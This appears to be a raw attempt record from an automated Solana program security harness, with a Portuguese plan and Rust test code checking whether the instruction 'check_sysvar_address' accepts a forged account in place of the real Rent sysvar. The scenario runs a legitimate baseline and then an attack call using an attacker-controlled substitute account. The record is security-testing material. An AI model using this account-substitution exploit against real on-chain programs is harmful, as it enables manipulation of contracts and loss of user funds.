attempts.raw:
{
  "plan": "O programa-alvo apenas recebe uma conta `rent` como AccountInfo e nao faz nada com ela. O baseline chama a instrucao com o Sysvar Rent real (sysvar::rent::ID) e deve ter sucesso. O ataque chama a mesma instrucao substituindo a conta `rent` por uma conta arbitraria controlada pelo atacante. O efeito medido e que a conta forjada foi aceita no lugar do Sysvar Rent, ou seja, a instrucao executou com sucesso mesmo com um endereco diferente do oficial.",
  "scenario": "let rent_id = solana_program::sysvar::rent::ID;
let rent_account = account(&rent_id, &[], None);

let attacker_rent = Pubkey::new_unique();
let attacker_rent_account = account(&attacker_rent, &[0u8; 32], None);

let metas = vec![AccountMeta::new_readonly(rent_id, false)];
let ix = env.anchor_ix("check_sysvar_address", &(), metas);
let contas = vec![(rent_id, rent_account.clone())];
let _ = env.baseline("uso legitimo com o Sysvar Rent real", &ix, &contas);

let metas_ataque = vec![AccountMeta::new_readonly(attacker_rent, false)];
let ix_ataque = env.anchor_ix("check_sysvar_address", &(), metas_ataque);
let contas_ataque = vec![(attacker_rent, attacker_rent_account.clone())];
let r = env.attack("substituir o Sysvar Rent por conta arbitraria", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    env.effect("conta forjada aceita no lugar do Sysvar Rent", after(&r, &attacker_rent).data() == attacker_rent_account.data());
}"
}

